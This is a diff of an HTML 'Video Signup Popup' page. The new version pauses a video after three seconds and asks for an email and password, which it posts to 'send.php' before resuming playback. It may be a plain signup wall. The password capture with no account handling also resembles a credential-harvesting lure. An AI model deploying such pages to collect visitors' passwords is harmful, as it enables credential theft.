@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Signup System</title>
+    <title>Video Signup Popup</title>
     <style>
         body {
             margin: 0;
@@ -26,47 +26,74 @@
             transform: translate(-50%, -50%);
             background: white;
             padding: 20px;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
             text-align: center;
-            border-radius: 5px;
+            border-radius: 10px;
+        }
+        .popup input {
+            display: block;
+            width: 100%;
+            margin: 10px 0;
+            padding: 10px;
+        }
+        .popup button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            cursor: pointer;
+        }
+        .popup button:hover {
+            background: #0056b3;
         }
     </style>
 </head>
 <body>
-    <video id="video" controls>
+
+    <video id="myVideo" autoplay>
         <source src="video1.mp4" type="video/mp4">
+        Your browser does not support the video tag.
     </video>
-    
-    <div class="popup" id="signupPopup">
-        <p>You need to sign up to continue watching.</p>
-        <button onclick="showSignupForm()">Sign Up</button>
+
+    <div id="signupPopup" class="popup">
+        <h2>Sign Up to Continue Watching</h2>
+        <input type="email" id="email" placeholder="Enter your email" required>
+        <input type="password" id="password" placeholder="Enter your password" required>
+        <button onclick="submitForm()">Sign Up</button>
     </div>
-    
-    <div class="popup" id="formPopup">
-        <form action="send_email.php" method="POST">
-            <p>Enter your details:</p>
-            <input type="email" name="email" placeholder="Email" required><br>
-            <input type="password" name="password" placeholder="Password" required><br>
-            <button type="submit">Submit</button>
-        </form>
-    </div>
-    
+
     <script>
-        let video = document.getElementById("video");
-        let signupPopup = document.getElementById("signupPopup");
-        let formPopup = document.getElementById("formPopup");
-        
-        video.addEventListener("timeupdate", function() {
-            if (video.currentTime >= video.duration / 2) {
-                video.pause();
-                signupPopup.style.display = "block";
+        const video = document.getElementById("myVideo");
+        const popup = document.getElementById("signupPopup");
+
+        setTimeout(() => {
+            video.pause();
+            popup.style.display = "block";
+        }, 3000);
+
+        function submitForm() {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            if (!email || !password) {
+                alert("Please enter your email and password.");
+                return;
             }
-        });
-        
-        function showSignupForm() {
-            signupPopup.style.display = "none";
-            formPopup.style.display = "block";
+
+            const formData = new FormData();
+            formData.append("email", email);
+            formData.append("password", password);
+
+            fetch("send.php", {
+                method: "POST",
+                body: formData
+            }).then(() => {
+                popup.style.display = "none";
+                video.play();
+            }).catch(error => console.error("Error:", error));
         }
     </script>
+
 </body>
 </html>
